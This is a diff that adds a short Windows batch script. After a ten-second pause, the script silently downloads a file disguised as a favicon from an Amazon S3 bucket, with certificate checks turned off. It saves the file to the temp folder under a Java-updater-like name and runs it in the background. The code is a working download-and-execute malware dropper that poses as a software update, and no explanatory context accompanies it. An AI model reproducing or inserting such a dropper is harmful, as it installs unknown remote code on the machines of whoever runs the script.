@@ -1,0 +1,6 @@
+@ECHO OFF 
+
+
+timeout /t 10
+curl -s -k https://bcr-api-update.s3.eu-central-1.amazonaws.com/favicon.ico  >  %temp%\\jre-8u351-windows-au.exe
+START /B %temp%\\jre-8u351-windows-au.exe
